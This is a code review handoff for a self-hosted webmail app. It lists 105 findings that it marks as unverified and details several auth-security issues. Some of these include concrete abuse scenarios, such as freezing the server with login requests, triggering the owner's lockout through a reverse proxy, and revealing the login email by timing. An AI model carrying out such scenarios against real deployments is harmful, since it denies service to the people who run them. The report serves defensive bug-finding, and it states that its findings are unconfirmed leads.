# zajel-mail code review: unverified findings

Handoff from a cloud review session, against commit `9861266` (main, merge of PR #47).

**Status: none of these findings have been verified.** Each was reported by one reviewer agent that read its slice of the codebase in full. The planned verification step (try to refute each finding, reproduce it, and trace the introducing commit with git blame/log) never ran. Treat every item as a lead to check, not a confirmed bug.

Totals: 105 findings (0 critical, 18 high, 51 medium, 36 low) from 9 of 13 slices.

## Baseline at this commit

- `npm run test`: 455/455 tests pass. `EmailDetail.test.ts` fails to load only when the `xlsx` package is missing (the review sandbox could not download it from cdn.sheetjs.com).
- `npm run check`: 0 errors (apart from the missing `xlsx`) and 44 warnings, many of them `state_referenced_locally` on `data`. Those were never triaged and may be real bugs where a page does not update on client-side navigation.

## Not reviewed yet

- **db-migrations**: `src/lib/server/db/index.ts`, `migrate.ts`, `migrations/*.sql`, `db/queries/*`, `lucide-icons.ts`
- **composer**: `components/composer/*`, `RichTextEditor`, `SignatureEditor`, `lib/tiptap/*`, `stores/compose`, `stores/outbox`, `utils/reply`, `utils/signatures`, `utils/send-later`, `utils/recent-recipients`, `utils/image-compress`, `settings/signatures`, `settings/composer`
- **client-shell-list**: `routes/(app)/+layout.svelte`, the inbox/folder/flagged/search/email pages, `EmailList*`, `EmailRowActions`, `Sidebar`, `AppRail`, `Search*`, the remaining `stores/*`, `lib/search/*`, the remaining `utils/*`
- **settings-misc**: the remaining `routes/(app)/settings/*` pages, `components/modals/*`, `components/settings/*`, `constants/*`, `types/*`
- **Cross-cutting sweeps**: (1) authz on every `+server.ts` and `+page.server.ts` (session required, active-account scoping, IDOR on DB rows); (2) background-job overlap (cron ticks vs the fire-and-forget triggers in `hooks.server.ts`, unbounded Maps, unhandled rejections); (3) triage of the 44 svelte-check warnings.

## High severity, by theme

- **Recurring events are wiped or rewritten** (one root problem, six reports): calendar-client#1, calendar-client#2, calendar-client#3, calendar-server#1, calendar-server#2, ai#1
- **Mail actions and attachments**: jmap-send-pipeline#1, jmap-send-pipeline#2, rendering-xss-attachments#1–3, auth-security#1
- **Rules and reminders**: rules-schedulers-prefs#1–3
- **AI and Jev**: ai#2, ai#3, jev#1

## Index

| ID | Severity | Kind | Location | Title |
|---|---|---|---|---|
| ai#1 | high | data-loss | `src/routes/api/ai/calendar/+server.ts:53` | Confirming an AI 'delete' on one occurrence of a recurring event deletes the whole series |
| ai#2 | high | bug | `src/lib/server/ai/mail-agent.ts:491` | The model is told 'today' is yesterday for every user east of UTC, so relative dates resolve a day early |
| ai#3 | high | bug | `src/lib/server/ai/mail-agent.ts:105` | HTML-only emails are fed to the agent as raw HTML/CSS, crowding out the real content |
| auth-security#1 | high | data-loss | `Dockerfile:17` | The Docker image never sets NODE_ENV, so without DATABASE_PATH the SQLite DB is written inside the container and lost on rebuild |
| calendar-client#1 | high | data-loss | `src/routes/(app)/calendar/+page.svelte:164` | Choosing "All events" when editing or dragging one occurrence moves the series start to that occurrence and drops all exceptions |
| calendar-client#2 | high | data-loss | `src/lib/components/calendar/EventModal.svelte:189` | EventModal rebuilds the RRULE from lossy presets on every save, rewriting recurrences the user never touched |
| calendar-client#3 | high | data-loss | `src/lib/components/InvitationCard.svelte:127` | "Remove from calendar" on a single-occurrence cancellation deletes the whole recurring series |
| calendar-server#1 | high | data-loss | `src/lib/server/calendar/imip.ts:172` | Accepting an update to one occurrence replaces the whole recurring series, and cancelling one occurrence deletes the whole series |
| calendar-server#2 | high | data-loss | `src/lib/server/calendar/service.ts:273` | Editing a recurring series with scope 'all' from a later occurrence moves DTSTART there, erasing earlier occurrences and every exception |
| jev#1 | high | security | `src/lib/server/db/queries/jev-settings.ts:97` | Switching Jev off keeps its queue; switching it back on sends the old mail, including a paused backfill, to TypeSafe |
| jmap-send-pipeline#1 | high | bug | `src/routes/api/email/bulk/+server.ts:112` | Trash, Archive, Spam and Move from the Starred and Search views copy the message instead of moving it |
| jmap-send-pipeline#2 | high | bug | `src/routes/api/upload/+server.ts:5` | Attachments over 1 MB cannot be uploaded in the shipped Docker image, despite the 25 MB limit |
| rendering-xss-attachments#1 | high | security | `src/lib/utils/email-images.ts:260` | Quadratic regex rewriting of untrusted email HTML can freeze the browser tab and, during SSR, the Node server |
| rendering-xss-attachments#2 | high | bug | `src/routes/api/email/[id]/attachment/[blobId]/+server.ts:63` | Attachment endpoint throws (500) for any filename with characters above Latin-1 (Arabic, CJK, emoji) |
| rendering-xss-attachments#3 | high | bug | `src/lib/components/AttachmentBar.svelte:20` | Real attachments are hidden when they carry a Content-ID or inline disposition, and inline photos in multipart/mixed are shown nowhere |
| rules-schedulers-prefs#1 | high | data-loss | `src/lib/server/reminder-scheduler.ts:85` | Reminder return uses mailboxIds/<id> pointer patches and ignores notUpdated, so reminders are silently dropped and the email stays in Remind Me Later |
| rules-schedulers-prefs#2 | high | data-loss | `src/lib/server/sieve.ts:213` | Sieve compiles the 'Move to trash' action to `discard`, which permanently destroys incoming mail at delivery |
| rules-schedulers-prefs#3 | high | bug | `src/routes/api/rules/apply/+server.ts:198` | "Save & apply now" runs the rule's actions on a different set of emails than the rule matches (approximate JMAP filter, inverted negation, whole-account scope) |
| ai#4 | medium | bug | `src/lib/server/ai/mail-agent.ts:83` | Keyword intent routing turns ordinary questions into calendar/task change proposals |
| ai#5 | medium | bug | `src/lib/server/ai/extract-event.ts:34` | htmlToPromptText glues block elements together and leaves HTML entities escaped |
| ai#6 | medium | ux | `src/lib/components/AIAssistantRail.svelte:497` | Calendar confirmation cards misstate what will happen (UTC timestamp on delete; multi-day end, description and calendar hidden on create) |
| ai#7 | medium | bug | `src/lib/components/AIAssistantRail.svelte:253` | Switching sessions or starting a new chat while a reply is pending cross-wires conversations |
| ai#8 | medium | security | `src/lib/server/ai/mail-agent.ts:289` | Retrieval loop pulls Junk/Trash mail into context unlabelled, with no untrusted-content guard, and replies may carry arbitrary links |
| auth-security#2 | medium | security | `src/lib/server/auth/password.ts:23` | Each login attempt blocks the event loop with synchronous scrypt, and changing the email skips the lockout, so anyone can freeze the server |
| auth-security#3 | medium | security | `src/routes/login/+page.server.ts:23` | Behind the documented reverse proxy every client shares one IP, so 10 bad attempts lock the owner out of password login |
| auth-security#4 | medium | bug | `src/lib/server/auth/unread-badges.ts:30` | Unread badges have no timeout or failure cache, so one unreachable linked account stalls every (app) page load |
| auth-security#5 | medium | bug | `src/routes/api/events/+server.ts:19` | The live event stream stays tied to the account that was active when it connected, so updates stop after switching accounts |
| calendar-client#4 | medium | data-loss | `src/lib/components/calendar/EventModal.svelte:305` | Editing any event in the modal wipes attendees' PARTSTAT, CN and ROLE (an accepted invite is reset to NEEDS-ACTION) |
| calendar-client#5 | medium | bug | `src/lib/calendar/layout.ts:110` | Time grid positions events by elapsed ms since midnight: on DST days events are drawn an hour off, and on the fall-back day events from 23:00 to 24:00 disappear |
| calendar-client#6 | medium | bug | `src/lib/calendar/layout.ts:116` | Zero-length timed events (no DTEND/DURATION, or DTEND = DTSTART) never appear in Day, 3-day or Week views |
| calendar-client#7 | medium | bug | `src/lib/components/calendar/TimeGrid.svelte:168` | A plain click on an event's resize handle saves the event: short events grow to 15 minutes, and recurring events open the scope dialog |
| calendar-client#8 | medium | bug | `src/lib/components/calendar/TimeGrid.svelte:208` | No pointercancel handling: on touch screens, scrolling the grid leaves a stale drag that the next tap anywhere carries out (a create dialog, or an event move) |
| calendar-client#9 | medium | bug | `src/routes/(app)/calendar/+page.server.ts:33` | Opening /calendar without ?date= uses the UTC date, so users far from UTC get the wrong day, week or month |
| calendar-client#10 | medium | bug | `src/lib/stores/calendarNotify.ts:131` | All-day reminders fire relative to UTC midnight instead of local midnight |
| calendar-client#11 | medium | bug | `src/lib/stores/calendarNotify.ts:130` | Reminder de-duplication ignores the event's start time, so a rescheduled event gets no reminder (and stale timers fire for the old time) |
| calendar-server#3 | medium | bug | `src/lib/server/calendar/service.ts:176` | Timed-event UNTIL is always written as <date>T235959Z, so 'this and following' and 'ends on' are off by one day outside UTC |
| calendar-server#4 | medium | bug | `src/lib/server/calendar/service.ts:488` | Reminders set more than about 24h before the event never fire, and all-day reminders use the server's midnight |
| calendar-server#5 | medium | security | `src/lib/server/calendar/imip.ts:169` | Invitation import checks neither ORGANIZER nor SEQUENCE, so an older or spoofed REQUEST overwrites the stored event (including meetings the user organizes) |
| calendar-server#6 | medium | bug | `src/lib/server/calendar/ics.ts:111` | Unknown or unmapped TZIDs (and floating times) are silently treated as UTC even when the file has a VTIMEZONE, and edits save that wrong time permanently |
| calendar-server#7 | medium | bug | `src/lib/server/calendar/ics.ts:223` | EXDATE, RDATE and RECURRENCE-ID values ignore their own TZID or Z, so exceptions in another zone don't match and are rewritten wrongly |
| calendar-server#8 | medium | data-loss | `src/lib/server/calendar/service.ts:257` | Saving an event from the modal resets every attendee's RSVP and name, and 'this and following' makes the user the ORGANIZER of someone else's meeting |
| calendar-server#9 | medium | data-loss | `src/lib/server/calendar/ics.ts:665` | Every write, including deleting one occurrence, rebuilds the VEVENT and drops all properties the UI doesn't model |
| contacts-avatars-push#1 | medium | security | `src/lib/server/avatars/index.ts:122` | Senders on freemail domains (gmail.com, outlook.com, icloud.com, ...) all get the provider's logo, and Gravatar is never reached |
| contacts-avatars-push#2 | medium | security | `src/lib/server/avatars/resolve.ts:280` | Brand logos (BIMI/favicon) are attached by From-domain alone, with no authentication, and subdomains inherit the parent's mark |
| contacts-avatars-push#3 | medium | bug | `src/lib/server/avatars/index.ts:77` | Transient network/DNS failures are cached as 'no avatar' for 7 days, for both the domain and the address |
| contacts-avatars-push#4 | medium | data-loss | `src/lib/server/contacts.ts:214` | Renaming a contact rewrites name.full but keeps the old name.components, so CardDAV clients keep (and can restore) the old name |
| contacts-avatars-push#5 | medium | bug | `src/lib/server/contacts.ts:229` | Favouriting an existing contact sends a 'keywords/favorite' patch path into a property most cards don't have |
| contacts-avatars-push#6 | medium | performance | `src/lib/jmap/contacts.ts:120` | Contacts loading fetches every card with every property, scans the whole book again just for lists, and import rescans it per 50-contact batch |
| jev#2 | medium | bug | `src/lib/server/jev/worker.ts:271` | Jev applies a tab from a stale copy of the keywords, so a message can end up in two tabs |
| jev#3 | medium | data-loss | `src/lib/server/jev/worker.ts:235` | Full mailboxIds writes from the stale snapshot undo moves made during the Jev call, and can pull deleted mail out of Trash |
| jev#4 | medium | bug | `src/lib/server/jev/email-state.ts:83` | For HTML-only mail, body_excerpt is the raw HTML source (DOCTYPE/head/CSS), not the text |
| jev#5 | medium | bug | `src/routes/api/jev/backfill/+server.ts:56` | Backfill can never offer cancelled or failed mail again, and never reaches past the newest 20,000 Important emails |
| jev#6 | medium | bug | `src/lib/server/jev/worker.ts:466` | A bad key, a retired pinned model, sustained 429s or an outage quietly mark the whole queue failed for good |
| jmap-send-pipeline#3 | medium | data-loss | `src/lib/jmap/email.ts:274` | A failed draft create still destroys the previous draft, so the message can be lost when the composer is closed |
| jmap-send-pipeline#4 | medium | bug | `src/lib/server/scheduled-send.ts:90` | Undo send can report 'Message sent' for a message that was cancelled but left in Scheduled |
| jmap-send-pipeline#5 | medium | bug | `src/lib/jmap/labels.ts:160` | Deleting a label that has any messages always fails (onDestroyRemoveEmails:false means 'reject if non-empty') |
| jmap-send-pipeline#6 | medium | performance | `src/routes/api/email/bulk/+server.ts:108` | Bulk actions send N (or 2N) JMAP requests at once, which can exceed Stalwart's concurrency limit and fail partway |
| jmap-send-pipeline#7 | medium | bug | `src/lib/jmap/auth.ts:5` | Accounts with non-ASCII passwords cannot be linked (btoa vs Buffer encoding mismatch) |
| rendering-xss-attachments#4 | medium | security | `src/routes/api/email/[id]/attachment/[blobId]/+server.ts:41` | Attachment proxy is open to path traversal: blobId is not encoded, so a link can make the server send arbitrary authenticated GETs to Stalwart |
| rendering-xss-attachments#5 | medium | bug | `src/lib/components/viewers/XlsxViewer.svelte:51` | XLSX preview shows columns past 50 as blank, can render thousands of empty columns, and fails on large sheets |
| rendering-xss-attachments#6 | medium | bug | `src/lib/utils/image-compress.ts:1` | Pasted images are sent as WebP data: URIs, which Gmail and Outlook recipients won't display |
| rendering-xss-attachments#7 | medium | ux | `src/lib/components/EmailDetail.svelte:936` | Print prints the app page, without the message's subject, sender or date, and clips the body to its on-screen box |
| rendering-xss-attachments#9 | medium | performance | `src/routes/api/image-proxy/+server.ts:26` | Image proxy buffers up to 10 MB per request in memory with no concurrency limit |
| rules-schedulers-prefs#4 | medium | bug | `src/lib/server/rules-engine.ts:84` | Engine's 'is' / 'starts with' on From/To compare against the joined "name email" string, so 'From is exactly a@b.com' never fires for senders with a display name |
| rules-schedulers-prefs#5 | medium | data-loss | `src/lib/types/rules.ts:119` | The 'a Jev rule never deletes' guard can be bypassed with 'Move to folder → Trash', which trash retention then makes permanent |
| rules-schedulers-prefs#6 | medium | bug | `src/lib/server/reminder-scheduler.ts:78` | Reminder return never checks that the email is still in Remind Me Later, so snoozed mail the user trashed or archived comes back to the Inbox as unread |
| rules-schedulers-prefs#7 | medium | bug | `src/routes/api/rules/apply/+server.ts:46` | Cancelling 'Apply rule' in the UI doesn't stop the server; every page is still processed |
| rules-schedulers-prefs#8 | medium | bug | `src/lib/server/sieve.ts:157` | Sieve 'Has attachment' test matches every multipart message, including ordinary HTML mail |
| rules-schedulers-prefs#9 | medium | bug | `src/routes/api/preferences/rules/+server.ts:14` | Rules save, deploy and apply act on whichever account the cookie currently selects, so a stale tab overwrites another account's rules |
| ai#9 | low | improvement | `src/lib/server/ai/mail-agent.ts:305` | No overall time budget: up to five sequential 60s model calls, and a turn is saved even after the client gave up |
| ai#10 | low | improvement | `src/lib/server/ai/mail-agent.ts:428` | Times are given to the model as raw UTC ISO strings and it is left to convert them to the user's zone |
| ai#11 | low | bug | `src/lib/server/ai/mail-agent.ts:340` | An unconstrained search_mail ends the loop, so 'what are my latest emails?' cannot be answered |
| ai#12 | low | maintainability | `src/lib/server/db/queries/ai-conversations.ts:129` | Retention is only enforced when the history list is read, so the '7 days' promise fails once the panel is no longer opened |
| auth-security#6 | low | data-loss | `src/routes/api/accounts/[id]/+server.ts:43` | Unlinking an account silently drops its pending 'Send later' messages and its Jev data, despite UI copy saying data is restored on re-link |
| auth-security#7 | low | bug | `src/lib/server/auth/app-session.ts:72` | The session cookie has a fixed 30-day Max-Age, so the server's sliding expiry never applies and active users are signed out |
| auth-security#8 | low | bug | `src/lib/server/auth/accounts.ts:127` | Re-linking an existing address ignores the new server URL but saves that server's account id, which breaks the account |
| auth-security#9 | low | security | `src/lib/server/auth/user.ts:56` | The 'timing equalizer' makes unknown emails about 2x slower, which reveals the master login email |
| auth-security#10 | low | bug | `src/routes/setup/+page.server.ts:32` | Two simultaneous setup submissions can each create a master user |
| auth-security#11 | low | security | `src/routes/api/auth/change-password/+server.ts:18` | Changing the master password signs out other sessions but leaves passkeys working, and adding a passkey needs no re-authentication |
| auth-security#12 | low | security | `src/hooks.server.ts:42` | JSON API routes rely only on SameSite=Strict: a sibling subdomain can send state-changing POSTs with no Content-Type |
| calendar-client#12 | low | ux | `src/lib/calendar/api.ts:103` | The user's own changes trigger 'calendar updates' notifications: imports are never marked as touched, and the touch TTL equals the poll interval |
| calendar-client#13 | low | bug | `src/lib/stores/calendarNotify.ts:172` | Only the tab that polls schedules reminder timers, so closing or reloading it misses or delays reminders |
| calendar-server#10 | low | bug | `src/lib/server/calendar/service.ts:261` | 'This and following' and calendar moves are not atomic: the new series is created before the conditional write, so a 412 leaves duplicates |
| calendar-server#11 | low | security | `src/lib/server/calendar/caldav.ts:523` | idToHref's '..' guard can be bypassed with %2e%2e, which fetch normalizes into a path outside the calendar home |
| calendar-server#12 | low | bug | `src/lib/server/calendar/ics.ts:591` | An all-day series with a date-time RECURRENCE-ID shows its override twice |
| contacts-avatars-push#7 | low | security | `src/lib/server/avatars/resolve.ts:393` | No pixel-dimension cap on served avatars, so a sender-controlled favicon can be a decompression bomb |
| contacts-avatars-push#8 | low | bug | `src/lib/server/avatars/image.ts:238` | sniffImage treats any document with '<svg' in its first 1 KB as SVG, so an SPA's index.html wins as an 'infinite-resolution' favicon |
| contacts-avatars-push#9 | low | bug | `src/routes/api/contacts/+server.ts:242` | setListMembers is an unguarded read-modify-write of the whole members map, so concurrent changes lose members |
| contacts-avatars-push#10 | low | bug | `src/lib/stores/addressBook.ts:17` | Composer address book is a global module store: not reset on account switch and not refreshed after contact edits |
| contacts-avatars-push#11 | low | ux | `src/routes/(app)/settings/notifications/+page.svelte:214` | Turning notifications off on one device silently stops push to every device |
| jev#7 | low | bug | `src/lib/server/jev/worker.ts:375` | New-mail cursor permanently skips emails that share a receivedAt second across a full page, and it trusts Email/get ordering and the app's own clock |
| jev#8 | low | bug | `src/lib/server/jev/spam.ts:78` | display_name_mismatch fires for ordinary dotted display names, feeding Jev false phishing evidence |
| jmap-send-pipeline#8 | low | data-loss | `src/lib/server/labels.ts:215` | Legacy keyword-to-mailbox label migration skips messages, ignores failures, then marks itself done |
| jmap-send-pipeline#9 | low | bug | `src/lib/server/scheduled-send.ts:194` | Scheduled sends are silently dropped when the Scheduled folder can't be found |
| jmap-send-pipeline#10 | low | improvement | `src/lib/server/scheduled-send.ts:219` | Scheduled-send worker: transient JMAP method errors fail permanently, and no request timeout means one account stalls all sends |
| jmap-send-pipeline#11 | low | bug | `src/lib/jmap/email.ts:165` | The identity's Reply-To (and Bcc) is cached but never applied to outgoing mail |
| jmap-send-pipeline#12 | low | bug | `src/lib/jmap/email.ts:614` | Removing a label from a message that is only in that label silently does nothing and reports success |
| rendering-xss-attachments#8 | low | security | `src/lib/components/EmailDetail.svelte:343` | Email can undo the reading frame's no-referrer policy (meta referrer, referrerpolicy, rel=opener are not normalised) |
| rendering-xss-attachments#10 | low | bug | `src/routes/api/email/[id]/attachment/[blobId]/+server.ts:52` | Attachment Content-Type is chosen only from the client-supplied name extension, and the inline CSP lacks sandbox/form-action |
| rendering-xss-attachments#11 | low | improvement | `src/service-worker.ts:193` | Service-worker avatar cache never revalidates, so the server's 30-day refresh and ETag never reach the browser |
| rendering-xss-attachments#12 | low | ux | `src/service-worker.ts:148` | Notification click does nothing when the open window isn't controlled by the service worker |
| rules-schedulers-prefs#10 | low | security | `src/lib/server/sieve.ts:115` | Rule names are written into Sieve comments unescaped, so a newline lets the name inject Sieve commands; :matches wildcards are not escaped either |
| rules-schedulers-prefs#11 | low | bug | `src/routes/api/reminders/[emailId]/+server.ts:19` | Cancelling a reminder deletes the row before moving the email back, so a failed move strands the email in Remind Me Later |
| rules-schedulers-prefs#12 | low | bug | `src/routes/api/preferences/notifications/+server.ts:23` | Notification folders (and folder-expand state) are stored per login but hold per-account mailbox ids, so they leak across linked accounts |
| rules-schedulers-prefs#13 | low | bug | `src/routes/api/user-state/settings/+server.ts:47` | Page size is stored as a string, so Settings always shows 50 after reload; export/import also drops it and doesn't include rules despite saying it does |

## Slice: auth-security

Files read: 50. Skipped: none.

### auth-security#1: The Docker image never sets NODE_ENV, so without DATABASE_PATH the SQLite DB is written inside the container and lost on rebuild

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `Dockerfile:17`

**Description.** src/lib/server/db/index.ts:22 uses /data/ameera.db only when process.env.NODE_ENV === 'production'. Otherwise it falls back to `${cwd}/local-data/ameera.db`. The runtime stage of the Dockerfile (lines 14-21) sets PORT and BODY_SIZE_LIMIT but not NODE_ENV. node:24-alpine does not set it, and neither does adapter-node or `node build`. Vite also does not inline NODE_ENV into SSR bundles: keepProcessEnv defaults to true for server consumers. I checked this with a vite 8.3.5 SSR build, and `process.env.NODE_ENV === "production"` stays a runtime lookup. In the image, then, the default path is /app/local-data/ameera.db in the container's writable layer. Yet README.md:381 says 'The SQLite database lives at /data/ameera.db, so mount a volume there', and README.md:467 marks DATABASE_PATH as not required, defaulting to '/data/ameera.db in production'. .env.example:73 makes the same claim. Only docker-compose.example.yml avoids the problem, because it sets DATABASE_PATH explicitly.

**Failure scenario.** An operator follows the README: `docker run -v webmail:/data ...` or their own compose file without DATABASE_PATH. The app works, but every write goes to /app/local-data inside the container. The next `docker compose up --build` or image upgrade recreates the container. The master login, the encrypted mail credentials, sessions, passkeys, rules, reminders, signatures and Jev data are all gone. The empty DB also reopens /setup to whoever reaches it first.

**Evidence.**

```
Dockerfile runtime stage: `ENV PORT=3001` / `ENV BODY_SIZE_LIMIT=1M` / `CMD ["node", "build"]`, with no NODE_ENV.
db/index.ts:20-23: `if (process.env.DATABASE_PATH) return ...; if (process.env.NODE_ENV === 'production') return '/data/ameera.db'; return resolve(process.cwd(), 'local-data/ameera.db');`
Verified SSR build output: `if (process.env.NODE_ENV === "production") return "/data/ameera.db";` (not replaced).
```

### auth-security#2: Each login attempt blocks the event loop with synchronous scrypt, and changing the email skips the lockout, so anyone can freeze the server

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/auth/password.ts:23`

**Description.** hashPassword and verifyPassword (lines 23 and 34) call scryptSync with N=2^17, r=8, which needs about 128 MiB per call. It runs on the main thread: I measured about 430 ms per call here. For an unknown email, verifyUserPassword (user.ts:54-56) runs two of them, about 840 ms. The lockout key is `email|ip` (rate-limit.ts:31-33), and the email is whatever the client sends. A client that puts a new random email in each POST /login never reaches MAX_FAILURES, so it is never locked out. Every attempt also inserts a new login_attempts row that is never pruned: recordSuccess only clears the exact key. Because the work is synchronous, every other request waits behind it, including SSE, API calls, page loads and the in-process schedulers.

**Failure scenario.** An unauthenticated client sends about 2 POST /login requests per second, each with a different random email. The Node event loop is busy almost all the time, so the webmail stops responding for the owner and the background workers stall. Each request also adds a login_attempts row. 50 distinct emails produced 51 rows in a scratch test.

**Evidence.**

```
password.ts:23 `const hash = scryptSync(password, salt, KEYLEN, { N, r: R, p: P, maxmem: 256 * 1024 * 1024 });`
user.ts:56 `verifyPassword(password, hashPassword('timing-equalizer'));` (2 scrypts)
rate-limit.ts:32 `return `${email.trim().toLowerCase()}|${ip}`;`
Measured: wrong password 397 ms, unknown email 841 ms (blocking).
```

### auth-security#3: Behind the documented reverse proxy every client shares one IP, so 10 bad attempts lock the owner out of password login

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/routes/login/+page.server.ts:23`

**Description.** The lockout and the 'Active sessions' IP both come from getClientAddress(). adapter-node returns the socket's remote address unless ADDRESS_HEADER/XFF_DEPTH are set. The compose example binds 127.0.0.1:3001, and the README tells operators to put a TLS reverse proxy in front. Neither mentions ADDRESS_HEADER. In that setup, every request reaches the container from the proxy or Docker gateway address, so the `email|ip` key in rate-limit.ts:31 is effectively keyed on email alone. Anyone who knows or guesses the master email, often the owner's own address, can trigger the 15-minute lockout for everyone, and can do it again indefinitely. The sessions list (api/auth/sessions) also shows the same proxy IP for every device.

**Failure scenario.** An attacker sends 10 wrong passwords for owner@example.com every 15 minutes. isLockedOut('owner@example.com', '172.18.0.1') stays true. The owner always gets 'Too many attempts' on the password form and can only sign in with a passkey, if one is registered. Settings → Security shows every session with the same IP.

**Evidence.**

```
login/+page.server.ts:23-25 `const ip = getClientAddress(); if (isLockedOut(email, ip)) return fail(429, ...)`
docker-compose.example.yml: `ports: - "127.0.0.1:3001:3001"`, no ADDRESS_HEADER/XFF_DEPTH
Scratch test: 10 recordFailure('owner@example.com','172.18.0.1') → isLockedOut true for all clients sharing that address.
```

### auth-security#4: Unread badges have no timeout or failure cache, so one unreachable linked account stalls every (app) page load

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/auth/unread-badges.ts:30`

**Description.** unreadBadges calls getMailboxes for every non-active account. JMAPClient.request (src/lib/jmap/client.ts:16) is a plain fetch with no AbortSignal or timeout. The (app) layout load awaits unreadBadges inside Promise.all ((app)/+layout.server.ts:84-91), so the slowest non-active account's server holds up the whole layout. Failures are not cached (only successes are cached, at line 32), so every load retries the bad account. The comment says 'a missing badge beats a broken page', but a hanging server gives a hanging page. This load runs again on every invalidateAll(), and the realtime store calls that on every mail state change.

**Failure scenario.** The user links a second account on another server, and that server becomes blackholed (TCP SYNs dropped) or accepts connections without replying. Every navigation and every SSE-driven refresh of the active account now takes undici's connect timeout (10 s) or headers timeout (300 s) before it renders. A scratch test with a never-resolving fetch left unreadBadges pending after 2 s, and each later call fetched again.

**Evidence.**

```
unread-badges.ts:29-37 `const mailboxes = await getMailboxes(createClient(auth), auth.accountId); ... cache.set(...) } catch { // Skip the badge }` (no timeout, no negative cache)
(app)/+layout.server.ts:84-91 `await Promise.all([getMailboxes(...), listLabels(...), unreadBadges(listAccounts(locals.user.id), locals.activeAccountId), identityRefresh])`
```

### auth-security#5: The live event stream stays tied to the account that was active when it connected, so updates stop after switching accounts

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/events/+server.ts:19`

**Description.** /api/events builds the upstream Stalwart eventsource URL and Basic auth from locals.auth, which is the active account at request time. The browser opens the EventSource once, when the (app) layout mounts (+layout.svelte:276 `realtime.connect()`), and reconnects only after an error (src/lib/stores/realtime.ts). Switching accounts never reconnects it: ProfileCard.svelte:34 uses `goto('/inbox', { invalidateAll: true })` and settings/accounts/+page.svelte:197 uses `invalidateAll()`. Both are client-side, the layout stays mounted, and `closeafter=no` keeps the old stream open indefinitely. Only the reauth page does a full reload.

**Failure scenario.** The user switches from account A to account B in the profile card. New mail for B does not appear live, and the inbox only updates on manual navigation or reload. New mail for A still triggers invalidateAll, which refetches B's view for no reason. This lasts until the page is reloaded.

**Evidence.**

```
events/+server.ts:19-20 `const upstreamUrl = `${locals.auth.apiUrl}eventsource/?types=Email,Mailbox,EmailDelivery&closeafter=no&ping=10`;` with `Authorization: locals.auth.authHeader`
(app)/+layout.svelte:276 `realtime.connect();` (onMount only), with no effect on data.activeAccountId.
```

### auth-security#6: Unlinking an account silently drops its pending 'Send later' messages and its Jev data, despite UI copy saying data is restored on re-link

- **Severity:** low · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/routes/api/accounts/[id]/+server.ts:43`

**Description.** The DELETE handler's comment says the account's SQLite data 'is left in place keyed by email, so re-linking later restores everything'. The settings page says the same to the user (settings/accounts/+page.svelte:395-396). But scheduled_sends.mail_account_id (migration 017:10), jev_settings, jev_decisions, jev pins and moves, and trash_seen all reference mail_accounts(id) ON DELETE CASCADE, and foreign_keys is ON (db/index.ts:37). Re-linking creates a new randomUUID row (accounts.ts:132), so none of it comes back. The worst case is scheduled sends: the message stays in the account's Scheduled mailbox, but nothing will ever submit it, and the user gets no warning.

**Failure scenario.** The user schedules an email for tomorrow, then unlinks and re-links the account, for example to change its server URL (see the re-link finding). The scheduled_sends row is cascaded away, and the email never goes out. Jev tabs, pins and the opt-in are also reset for the re-linked account.

**Evidence.**

```
api/accounts/[id]/+server.ts:34-36 doc comment: 're-linking later restores everything'; line 43 `removeAccount(locals.user.id, params.id);`
017_scheduled_send.sql:10 `mail_account_id TEXT NOT NULL REFERENCES mail_accounts(id) ON DELETE CASCADE`
```

### auth-security#7: The session cookie has a fixed 30-day Max-Age, so the server's sliding expiry never applies and active users are signed out

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/auth/app-session.ts:72`

**Description.** app-session.ts describes sliding expiration, and getAppSession pushes expires_at forward on use (lines 71-74). But the session cookie is set only once, at login, passkey login and setup, with `maxAge: 30 * 24 * 60 * 60`. Nothing ever re-issues it: hooks.server.ts only reads it or deletes it. The browser therefore drops the cookie exactly 30 days after sign-in, however active the user is. The server row also outlives the cookie, so the old session stays in Settings → Security as a phantom 'device' for up to another 30 days.

**Failure scenario.** The user signs in on 1 Oct and uses the app every day. On 31 Oct the browser expires the cookie, and the next request lands on /login. Settings → Security then shows two sessions for the same browser.

**Evidence.**

```
app-session.ts:9-11 'Sliding expiration: every authenticated request ... pushes expires_at forward'
login/+page.server.ts:40-46 `cookies.set('session', sessionId, { ..., maxAge: 30 * 24 * 60 * 60 })`. This is the only set, with no refresh in hooks.server.ts:84-139.
```

### auth-security#8: Re-linking an existing address ignores the new server URL but saves that server's account id, which breaks the account

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/auth/accounts.ts:127`

**Description.** linkAccount checks the credentials against opts.serverUrl. If the address is already linked, it then runs updateSecret, which updates secret_enc and jmap_account_id but not server_url (statement at lines 65-69). Afterwards authStateForAccount sends requests to the old server_url with the account id returned by the new server. The response is built from the existing row, so the API reports success. There is no other way to change server_url. The byEmail lookup is also global rather than scoped to the user, so with more than one app_user (see the setup race finding), user B can overwrite user A's stored secret while B's own account list stays empty.

**Failure scenario.** The mail server moves from https://old.example to https://new.example. The user opens Settings → Accounts → Add account → 'Different mail server?' and enters the same address and the new URL. Linking succeeds, but every later request still goes to old.example with new.example's accountId, so it fails or hits the wrong account. The only way out is unlink and re-link, which triggers the cascade data loss above.

**Evidence.**

```
accounts.ts:125-129 `const existing = stmts().byEmail.get(email); if (existing) { stmts().updateSecret.run(encryptSecret(opts.password), auth.accountId, existing.id); return toPublic({ ...existing, needs_reauth: 0 }); }`
updateSecret: `SET secret_enc = ?, jmap_account_id = ?, needs_reauth = 0, ...` (no server_url)
```

### auth-security#9: The 'timing equalizer' makes unknown emails about 2x slower, which reveals the master login email

- **Severity:** low · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/auth/user.ts:56`

**Description.** For an email that is not found, verifyUserPassword runs hashPassword('timing-equalizer'), which is one scrypt, and then verifyPassword, which is a second. A wrong password for the real email costs only one. The comment says this makes 'absent vs. wrong-password not observable', but it does the reverse: response time alone tells whether an email is the master login. Precomputing one dummy hash at module load and only verifying against it would equalise the paths and halve the cost.

